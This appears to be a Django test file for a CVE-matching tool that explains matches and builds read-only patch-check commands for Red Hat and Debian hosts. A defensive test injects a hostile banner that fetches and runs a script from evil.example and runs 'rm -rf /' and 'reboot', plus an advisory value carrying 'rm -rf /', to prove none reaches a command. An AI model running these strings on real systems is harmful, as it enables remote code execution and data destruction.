"""A match explains itself (cveFeed.match_explain): what was found in plain words, why it is shown and how sure cvENGINE is, the read-only
commands the host's owner runs to settle it with what each answer means, and the closure note each outcome leaves. On a Red Hat family host
the package changelog decides, never the upstream version. A host's open matches are grouped by the package that decides them, exploited
first. The REST and MCP match payloads carry ``explain``, the host payload ``validate_plan``. Commands are built from allow-listed package
names and validated CVE ids only: a hostile banner never reaches one."""
import json
import re

from django.test import TestCase
from django.utils import timezone

from agentapi.auth import create_token
from cveFeed import correlation, detection, match_explain
from cveFeed.models import CVEEntry, CVEMatch
from dashboard.models import Org, Project, ProjectMembership
from django.contrib.auth.models import User
from startScan.models import IpAddress, Port, Subdomain
from targetApp.models import Domain
from tests.test_agentapi import call, tool_call

RHEL_HEADER = 'Apache/2.4.37 (Red Hat Enterprise Linux) OpenSSL/1.1.1k'
APACHE = [{'vendor': 'apache', 'product': 'http_server', 'ranges': [{'introduced': '2.4.0', 'fixed': '2.4.60'}]}]
OPENSSL = [{'vendor': 'openssl', 'product': 'openssl', 'ranges': [{'introduced': '1.1.1', 'fixed': '1.1.1w'}]}]
PHP = [{'vendor': 'php', 'product': 'php', 'ranges': [{'introduced': '7.2.0', 'fixed': '7.2.34'}]}]
# what a command may contain: the command words, an allow-listed package name, CVE ids and the fixed quoting and format strings
SAFE_COMMAND = re.compile(r"^[A-Za-z0-9 ._/|'%{}\\=:$-]+\Z")


def commands_of(explained):
	return [s['command'] for s in explained['steps'] if s.get('command')]


class Base(TestCase):
	addresses = 0

	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		org = Org.objects.create(name='Zebra', slug='zebra-org')
		cls.project = Project.objects.create(name='Zebra', slug='zebra', insert_date=now, org=org)
		cls.domain = Domain.objects.create(name='zebra.example', project=cls.project, insert_date=now)
		cls.alice = User.objects.create_user('explain-alice', password='x')
		ProjectMembership.objects.create(user=cls.alice, project=cls.project, role='user')
		_, cls.token = create_token(cls.alice, 'agent')

	def host(self, name='gecmedia.zebra.example', webserver=RHEL_HEADER, ports=()):
		sub = Subdomain.objects.create(name=name, target_domain=self.domain, webserver=webserver, http_status=200)
		Base.addresses += 1
		ip = IpAddress.objects.create(address=f'192.0.2.{Base.addresses}')
		sub.ip_addresses.add(ip)
		for port in ports:
			ip.ports.add(port)
		return sub

	def cve(self, cve_id, affected, kev=False):
		return CVEEntry.objects.create(cve_id=cve_id, title=f'{cve_id} title', affected=affected, published_at=timezone.now(), cvss=7.5, kev=kev)

	def tech(self, sub, cve, product, version, rng, **kw):
		return CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='tech', matched_product=product, matched_version=version,
									   version_in_range=True, confidence=0.6, evidence={'source': 'tech', 'range': rng}, **kw)

	def explain(self, match):
		match = CVEMatch.objects.select_related('cve_entry', 'subdomain').get(pk=match.pk)
		return match_explain.explain(match, match_explain.host_hint(match.subdomain))


class MatchExplainTests(Base):
	def test_a_red_hat_banner_version_only_match_says_what_was_found_why_and_gives_the_changelog_check(self):
		sub = self.host()
		cve = self.cve('CVE-2024-38475', APACHE)
		out = self.explain(self.tech(sub, cve, 'Apache HTTP Server', '2.4.37', {'introduced': '2.4.0', 'fixed': '2.4.60'}))
		self.assertEqual(out['found'], 'The web server says it is Apache httpd 2.4.37 on Red Hat. CVE-2024-38475 affects Apache httpd from '
										'2.4.0 up to but not including 2.4.60.')
		self.assertIn('based only on the version in the Server header', out['why'])
		self.assertIn('Red Hat often fixes bugs without changing that version', out['why'])
		self.assertIn('Not confirmed', out['why'])
		self.assertEqual((out['confidence'], out['confidence_label'], out['basis']), ('not_confirmed', 'Not confirmed', 'version_only'))
		self.assertEqual(out['platform']['package'], 'httpd')
		self.assertEqual(out['question'], {'key': 'rhel:httpd', 'text': 'Is the installed httpd package patched?'})
		self.assertEqual(commands_of(out), ['rpm -q --changelog httpd | grep -F -e CVE-2024-38475',
											"rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE}\\n' httpd",
											'dnf updateinfo list cves | grep -F -e CVE-2024-38475'])
		for step in out['steps']:
			self.assertTrue(step['read_only'])
			self.assertTrue(step['needs'].startswith('A shell on the host'))
			self.assertTrue(step['outcomes'])
		self.assertIn('includes the fix', out['steps'][0]['outcomes']['fixed'])
		self.assertEqual(set(out['outcomes']), {'fixed', 'affected', 'cant_tell'})
		self.assertIn('every command only reads', out['who'])
		self.assertIn('gecmedia.zebra.example', out['who'])
		self.assertEqual(out['steps'][2]['url'], 'https://access.redhat.com/security/cve/CVE-2024-38475')

	def test_openssl_maps_to_openssl_and_php_to_php_and_debian_reads_its_own_changelog(self):
		sub = self.host()
		ssl = self.explain(self.tech(sub, self.cve('CVE-2023-0286', OPENSSL), 'OpenSSL', '1.1.1k', {'introduced': '1.1.1', 'fixed': '1.1.1w'}))
		self.assertEqual(ssl['platform']['package'], 'openssl')
		self.assertEqual(commands_of(ssl)[0], 'rpm -q --changelog openssl | grep -F -e CVE-2023-0286')
		php = self.explain(self.tech(sub, self.cve('CVE-2020-7070', PHP), 'PHP', '7.2.24', {'introduced': '7.2.0', 'fixed': '7.2.34'}))
		self.assertEqual(php['platform']['package'], 'php')
		self.assertEqual(commands_of(php)[0], 'rpm -q --changelog php-common | grep -F -e CVE-2020-7070')
		ubuntu = self.host('www.zebra.example', webserver='Apache/2.4.41 (Ubuntu)')
		deb = self.explain(self.tech(ubuntu, self.cve('CVE-2024-38476', APACHE), 'Apache HTTP Server', '2.4.41', {'fixed': '2.4.60'}))
		self.assertEqual(deb['platform']['package'], 'apache2')
		self.assertEqual(commands_of(deb)[0], 'zgrep -F -e CVE-2024-38476 /usr/share/doc/apache2/changelog.Debian.gz')
		self.assertEqual(deb['steps'][-1]['url'], 'https://ubuntu.com/security/CVE-2024-38476')
		self.assertIn('Ubuntu often fixes bugs', deb['why'])

	def test_a_host_of_unknown_distribution_is_asked_which_one_first(self):
		sub = self.host('plain.zebra.example', webserver='Apache/2.4.37')
		out = self.explain(self.tech(sub, self.cve('CVE-2024-38475', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'}))
		commands = commands_of(out)
		self.assertEqual(commands[0], 'cat /etc/os-release')
		self.assertIn('rpm -q --changelog httpd | grep -F -e CVE-2024-38475', commands)
		self.assertIn('zgrep -F -e CVE-2024-38475 /usr/share/doc/apache2/changelog.Debian.gz', commands)
		self.assertIn('Linux distributions often fix bugs', out['why'])

	def test_a_template_confirmed_match_says_it_was_confirmed(self):
		sub = self.host()
		match = self.tech(sub, self.cve('CVE-2021-41773', APACHE), 'Apache HTTP Server', '2.4.49', {'fixed': '2.4.51'},
						  template_result='vulnerable', template_id='CVE-2021-41773')
		out = self.explain(match)
		self.assertEqual((out['confidence'], out['basis']), ('confirmed', 'template'))
		self.assertIn('tested the host and the flaw answered', out['why'])
		self.assertIn('Confirmed by a check', out['why'])

	def test_a_generic_openvas_check_says_it_saw_a_behaviour_not_the_product(self):
		sub = self.host()
		cve = self.cve('CVE-2004-2320', [{'vendor': 'bea', 'product': 'weblogic_server'}, {'vendor': 'microsoft', 'product': 'iis'}])
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='openvas', matched_product='OpenVAS NVT 1.3.6.1.4.1.25623.1.0.11213 on 443/tcp',
										confidence=0.5, evidence={'source': 'openvas', 'oid': '1.3.6.1.4.1.25623.1.0.11213', 'nvt': 'HTTP Debugging Methods (TRACE/TRACK) Enabled',
																  'port': '443/tcp', 'qod': 99, 'qod_type': 'remote_vul', 'generic_check': True, 'result': 'TRACE is enabled'})
		out = self.explain(match)
		self.assertEqual((out['confidence'], out['basis']), ('not_confirmed', 'generic_check'))
		self.assertIn('saw a behaviour (quality of detection 99%), not the product', out['why'])
		self.assertIn('OpenVAS reported CVE-2004-2320 on port 443/tcp', out['found'])
		self.assertFalse(commands_of(out))
		self.assertIn('runs the product', out['steps'][0]['text'])
		self.assertIn('does not run the product', [c for c in out['close'] if c['status'] == 'false_positive'][0]['note'])

	def test_an_openvas_version_result_names_its_quality_and_its_package(self):
		sub = self.host()
		match = CVEMatch.objects.create(cve_entry=self.cve('CVE-2024-38474', APACHE), subdomain=sub, source='openvas', confidence=0.3,
										matched_product='OpenVAS NVT 1.3.6.1.4.1.25623.1.0.1 on 443/tcp', matched_version='2.4.37',
										evidence={'source': 'openvas', 'oid': '1.3.6.1.4.1.25623.1.0.1', 'port': '443/tcp', 'qod': 30, 'qod_type': 'remote_banner_unreliable',
												  'cpe': 'cpe:/a:apache:http_server:2.4.37', 'product': 'http server', 'installed_version': '2.4.37'})
		out = self.explain(match)
		self.assertEqual((out['basis'], out['platform']['package']), ('openvas_version', 'httpd'))
		self.assertIn('inferred this from the version it read (quality of detection 30%)', out['why'])
		self.assertEqual(commands_of(out)[0], 'rpm -q --changelog httpd | grep -F -e CVE-2024-38474')

	def test_red_hat_fix_data_slots_in_when_the_match_carries_it(self):
		# the shape a later change records: a distribution state for "fixed in a backport, confirm the installed build", the fixed build and the RHSA
		sub = self.host()
		match = self.tech(sub, self.cve('CVE-2024-38475', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'},
						  distro_status='backported', distro_fixed_version='httpd-2.4.37-65.el8_10.2')
		match.evidence = {**match.evidence, 'distro': {'distro': 'rhel', 'advisory': 'RHSA-2024:4720'}}
		match.save()
		out = self.explain(match)
		self.assertEqual(out['basis'], 'distro_backport')
		self.assertEqual(out['advisory'], {'advisory': 'RHSA-2024:4720', 'url': 'https://access.redhat.com/errata/RHSA-2024:4720',
										   'fixed_build': 'httpd-2.4.37-65.el8_10.2'})
		self.assertIn('Red Hat says it fixed CVE-2024-38475 in a backport in RHSA-2024:4720 (httpd-2.4.37-65.el8_10.2)', out['why'])
		self.assertEqual(out['steps'][1]['outcomes']['affected'], 'A build older than httpd-2.4.37-65.el8_10.2: still affected. Update the package.')
		self.assertIn('RHSA-2024:4720', out['steps'][2]['text'])
		self.assertEqual(out['steps'][2]['url'], 'https://access.redhat.com/errata/RHSA-2024:4720')
		# a value that is not an advisory or a build is never shown
		match.evidence = {**match.evidence, 'distro': {'distro': 'rhel', 'advisory': 'RHSA-2024:4720; rm -rf /'}}
		match.distro_fixed_version = 'x y'
		match.save()
		self.assertNotIn('advisory', self.explain(match))

	def test_the_red_hat_row_that_judged_the_match_names_its_advisory_and_build(self):
		# cveFeed.correlation.distro_fix_evidence's shape: distro_status "backport", evidence.distro_fix from the Red Hat row
		sub = self.host()
		match = self.tech(sub, self.cve('CVE-2024-38476', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'},
						  distro_status='backport', distro_fixed_version='0:2.4.37-65.module+el8.10.0+22069+b47f5c72.1')
		match.evidence = {**match.evidence, 'distro': {'distro': 'rhel', 'basis': 'host'},
						  'distro_fix': correlation.distro_fix_evidence(
							  {'distro': 'rhel', 'package': 'httpd'}, {'release': 'el8', 'package': 'httpd:2.4', 'status': 'fixed', 'advisory': 'RHSA-2024:4720'},
							  '0:2.4.37-65.module+el8.10.0+22069+b47f5c72.1')}
		match.save()
		out = self.explain(match)
		self.assertEqual(out['basis'], 'distro_backport')
		self.assertEqual(out['advisory'], {'advisory': 'RHSA-2024:4720', 'url': 'https://access.redhat.com/errata/RHSA-2024:4720',
										   'fixed_build': 'httpd-2.4.37-65.module+el8.10.0+22069+b47f5c72.1'})
		# a fixed version with no epoch is recorded as "name version": shown as the build name
		match.evidence['distro_fix']['fixed_build'] = 'httpd 2.4.37-66.el8'
		match.save()
		self.assertEqual(self.explain(match)['advisory']['fixed_build'], 'httpd-2.4.37-66.el8')
		# another distribution's row is never read as Red Hat's
		match.evidence['distro_fix'] = {'source': 'ubuntu', 'advisory': 'RHSA-2024:9999', 'fixed_build': 'apache2-2.4.41'}
		match.save()
		self.assertNotEqual(self.explain(match).get('advisory', {}).get('advisory'), 'RHSA-2024:9999')

	def test_a_hostile_banner_never_reaches_a_command(self):
		evil = "$(curl -s http://evil.example/x|sh) `id` ; rm -rf / Red Hat \"' && reboot"
		port = Port.objects.create(number=443, product='Apache httpd', version='2.4.37', service_extra=evil, cpe='cpe:/a:apache:http_server:2.4.37')
		sub = self.host('evil.zebra.example', webserver=f'Apache/2.4.37 ({evil})', ports=[port])
		matches = [
			self.tech(sub, self.cve('CVE-2024-38475', APACHE, kev=True), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'}),
			self.tech(sub, self.cve('CVE-2099-0001', APACHE), f'Apache HTTP Server {evil}', f'2.4.37 {evil}', {'fixed': '2.4.60'}),
			CVEMatch.objects.create(cve_entry=self.cve('CVE-2099-0002', APACHE), subdomain=sub, source='port', matched_product='Apache httpd',
									matched_version=f'2.4.37;{evil}', version_in_range=True,
									evidence={'source': 'port', 'port': 443, 'ip': '192.0.2.10', 'service_extra': evil, 'raw_version': evil}),
		]
		for m in matches:
			out = self.explain(m)
			for command in commands_of(out):
				self.assertRegex(command, SAFE_COMMAND)
				for bad in ('curl', 'evil', 'reboot', 'rm -rf', '`', '$(', ';', '&&', '"'):
					self.assertNotIn(bad, command)
			for close in out['close']:
				self.assertNotIn('$(', close['note'])
		host = call(self.token, 'GET', '/api/v1/projects/zebra/hosts')[1]['results'][0]
		for group in host['validate_plan']:
			for step in group['steps']:
				if step['command']:
					self.assertRegex(step['command'], SAFE_COMMAND)
					self.assertNotIn('evil', step['command'])

	def test_the_detection_record_reads_the_red_hat_changelog_not_the_upstream_version(self):
		cve = CVEEntry(cve_id='CVE-2024-38475', title='Apache mod_rewrite', affected=[{'vendor': 'apache', 'product': 'httpd', 'package': 'httpd',
																					   'ranges': [{'fixed': '2.4.60'}]}], cvss_vector='')
		strategy = detection.finalize(detection.rules_strategy(cve, []), '', cve.cve_id)
		rhel = [c for check in strategy['local_checks'] for c in check.get('commands', []) if c['platform'] == 'rhel']
		self.assertEqual(rhel[0]['command'], 'rpm -q --changelog httpd | grep -F -e CVE-2024-38475')
		self.assertEqual(rhel[0]['expect'], {'kind': 'output_names', 'value': 'CVE-2024-38475'})
		self.assertNotIn('version_lt', json.dumps(rhel))  # a build compared with the upstream version is no verdict on Red Hat


class HostPlanTests(Base):
	def setUp(self):
		self.sub = self.host()
		kev = self.cve('CVE-2024-38475', APACHE, kev=True)
		self.apache = [
			self.tech(self.sub, kev, 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'}),
			self.tech(self.sub, self.cve('CVE-2024-38476', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'}),
			# the same version reported by OpenVAS: one question with the tech matches
			CVEMatch.objects.create(cve_entry=self.cve('CVE-2024-38477', APACHE), subdomain=self.sub, source='openvas', confidence=0.3,
									matched_product='OpenVAS NVT 1.3.6.1.4.1.25623.1.0.2 on 443/tcp', matched_version='2.4.37',
									evidence={'source': 'openvas', 'port': '443/tcp', 'qod': 30, 'cpe': 'cpe:/a:apache:http_server:2.4.37',
											  'installed_version': '2.4.37'}),
		]
		self.openssl = [self.tech(self.sub, self.cve(f'CVE-2023-00{n}', OPENSSL), 'OpenSSL', '1.1.1k', {'fixed': '1.1.1w'}) for n in (86, 87, 88, 89)]
		# closed and ruled out matches settle nothing more
		self.tech(self.sub, self.cve('CVE-2024-0001', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'}, remediation_status='fixed')

	def test_the_plan_groups_matches_by_package_orders_kev_first_and_lists_what_each_command_resolves(self):
		host = call(self.token, 'GET', '/api/v1/projects/zebra/hosts')[1]['results'][0]
		plan = host['validate_plan']
		self.assertEqual([g['key'] for g in plan], ['rhel:httpd', 'rhel:openssl'])  # KEV first, although openssl settles more matches
		httpd, ssl = plan
		self.assertEqual(httpd['question'], 'Is the installed httpd package patched?')
		self.assertTrue(httpd['kev'])
		self.assertEqual(sorted(r['match_id'] for r in httpd['resolves']), sorted(m.pk for m in self.apache))
		self.assertEqual(httpd['cves'], ['CVE-2024-38475', 'CVE-2024-38476', 'CVE-2024-38477'])
		self.assertEqual(httpd['resolves'][0]['cve_id'], 'CVE-2024-38475')  # the exploited one first
		self.assertEqual({r['source'] for r in httpd['resolves']}, {'tech', 'openvas'})
		self.assertEqual(httpd['steps'][0]['command'],
						 'rpm -q --changelog httpd | grep -o -F -e CVE-2024-38475 -e CVE-2024-38476 -e CVE-2024-38477 | sort -u')
		self.assertEqual(ssl['count'], 4)
		self.assertEqual(sorted(r['match_id'] for r in ssl['resolves']), sorted(m.pk for m in self.openssl))
		self.assertFalse(ssl['kev'])
		self.assertTrue(all(s['read_only'] for g in plan for s in g['steps']))
		# presentation only: every stored match is still there, unchanged
		self.assertEqual(CVEMatch.objects.filter(subdomain=self.sub).count(), 8)

	def test_rest_and_mcp_carry_explain_and_validate_plan(self):
		match = self.apache[0]
		status, rows = call(self.token, 'GET', '/api/v1/projects/zebra/matches')
		self.assertEqual(status, 200)
		row = next(r for r in rows['results'] if r['id'] == match.pk)
		self.assertEqual(row['explain']['steps'][0]['command'], 'rpm -q --changelog httpd | grep -F -e CVE-2024-38475')
		status, detail = call(self.token, 'GET', f'/api/v1/projects/zebra/findings/match/{match.pk}')
		self.assertEqual(status, 200)
		self.assertEqual(detail['explain']['question']['key'], 'rhel:httpd')
		self.assertIn('confirm', detail)  # the per-match guide stays: explain is on top of it
		error, mcp = tool_call(self.token, 'get_finding', {'project': 'zebra', 'kind': 'match', 'id': match.pk})
		self.assertFalse(error)
		self.assertEqual(mcp['explain']['confidence'], 'not_confirmed')
		error, listed = tool_call(self.token, 'list_cve_matches', {'project': 'zebra'})
		self.assertFalse(error)
		self.assertTrue(all('explain' in r for r in listed['results']))
		error, hosts = tool_call(self.token, 'list_hosts', {'project': 'zebra'})
		self.assertFalse(error)
		self.assertEqual(hosts['results'][0]['validate_plan'][0]['key'], 'rhel:httpd')

	def test_closing_with_the_evidence_prefills_the_note_and_uses_the_normal_closure(self):
		match = self.apache[0]
		detail = call(self.token, 'GET', f'/api/v1/projects/zebra/findings/match/{match.pk}')[1]
		choices = {c['status']: c for c in detail['explain']['close']}
		self.assertEqual(set(choices), {'fixed', 'false_positive'})
		self.assertIn('`rpm -q --changelog httpd | grep -F -e CVE-2024-38475` names CVE-2024-38475', choices['fixed']['note'])
		self.assertIn('backported without changing the version', choices['false_positive']['note'])
		note = choices['fixed']['note'] + 'httpd-2.4.37-65.el8_10.2'
		status, body = call(self.token, 'PATCH', f'/api/v1/projects/zebra/findings/match/{match.pk}', {'status': 'fixed', 'note': note})
		self.assertEqual(status, 200)
		match.refresh_from_db()
		self.assertEqual((match.remediation_status, match.remediation_note, match.remediation_by), ('fixed', note, self.alice))
		self.assertEqual(body['closed_by']['username'], 'explain-alice')
		self.assertFalse(body['closed_automatically'])
		self.assertEqual(body['explain']['close'], [])  # a closed match offers no closure
		# the closed match no longer counts in the host's plan
		host = call(self.token, 'GET', '/api/v1/projects/zebra/hosts')[1]['results'][0]
		self.assertNotIn(match.pk, [r['match_id'] for g in host['validate_plan'] for r in g['resolves']])
